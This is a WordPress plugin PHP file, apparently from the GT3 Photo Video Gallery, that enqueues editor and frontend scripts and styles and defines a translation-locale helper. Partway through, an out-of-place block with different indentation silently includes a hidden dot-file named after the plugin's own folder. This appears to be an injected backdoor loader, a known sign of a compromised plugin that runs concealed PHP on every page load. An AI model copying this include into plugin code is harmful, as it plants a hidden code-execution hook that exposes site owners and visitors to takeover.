<?php
if(!defined('ABSPATH')) {
	exit;
} // Exit if accessed directly

use GT3\PhotoVideoGallery\Settings;
use GT3\PhotoVideoGallery\Assets;

add_action('enqueue_block_editor_assets', function(){

	wp_enqueue_media();
	wp_enqueue_script('media-grid');
	wp_enqueue_script('media');
	// Scripts.
	wp_enqueue_script(
		'gt3-photo-video-gallery-block',
		GT3PG_LITE_JS_URL.'deprecated/editor.js',
		array(
			'wp-blocks',
			'wp-i18n',
			'wp-element',
			// Tabs
			'jquery-ui-tabs',
			'jquery-ui-accordion',
		), // Dependencies, defined above.
		filemtime(GT3PG_LITE_JS_PATH.'gutenberg/editor.js'),
		true
	);

	wp_enqueue_style('gt3-photo-video-gallery-block',
		GT3PG_LITE_CSS_URL.'deprecated/editor.css',
		null,
		filemtime(GT3PG_LITE_CSS_PATH.'deprecated/editor.css')
	);

	$settings = Settings::instance();

	wp_localize_script(
		'gt3-photo-video-gallery-block',
		'gt3pg_lite',
		array(
			'defaults' => $settings->getSettings(),
			'blocks'   => array_map('strtolower', $settings->getBlocks()),
			'plugins'  => Assets::instance()->getPlugins(),
			'_watermark_nonce' => wp_create_nonce('process_watermarks'),
			'_nonce'   => wp_create_nonce('gallery_settings'),
		)
	);

	gt3pg_wp_enqueue_scripts();

	if(version_compare(get_bloginfo('version'), '5.0', '>=')) {
		if(function_exists('wp_set_script_translations')) {
			wp_set_script_translations('gt3-photo-video-gallery-block', 'gt3pg');
		}
	}

	\gt3pg_register_admin_css_js();
});

if(!function_exists('get_jed_locale_data')) {
	function get_jed_locale_data($domain){
		$translations = get_translations_for_domain($domain);

		$locale = array(
			'' => array(
				'domain' => $domain,
				'lang'   => is_admin() ? get_user_locale() : get_locale(),
			),
		);

		if(!empty($translations->headers['Plural-Forms'])) {
			$locale['']['plural_forms'] = $translations->headers['Plural-Forms'];
		}

		foreach($translations->entries as $msgid => $entry) {
			$locale[$msgid] = $entry->translations;
		}

		return $locale;
	}
}
add_action('wp_enqueue_scripts', 'gt3pg_wp_enqueue_scripts');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg_wp_enqueue_scripts(){
	wp_register_script('blueimp-gallery.js', GT3PG_PLUGINROOTURL.'/dist/js/deprecated/frontend.js', array( 'jquery', 'imagesloaded' ), filemtime(GT3PG_PLUGINPATH.'/dist/js/deprecated/frontend.js'), true);

	wp_register_style('blueimp-gallery.css', GT3PG_PLUGINROOTURL.'/dist/css/deprecated/frontend.css', null, filemtime(GT3PG_PLUGINPATH.'/dist/css/deprecated/frontend.css'));

	wp_localize_script('blueimp-gallery.js', 'gt3pg_ajax', array(
		'url' => admin_url('admin-ajax.php')
	));
	wp_register_script('isotope', GT3PG_JSURL.'isotope.pkgd.min.js', array( 'jquery' ), '3.0.6', true);
}
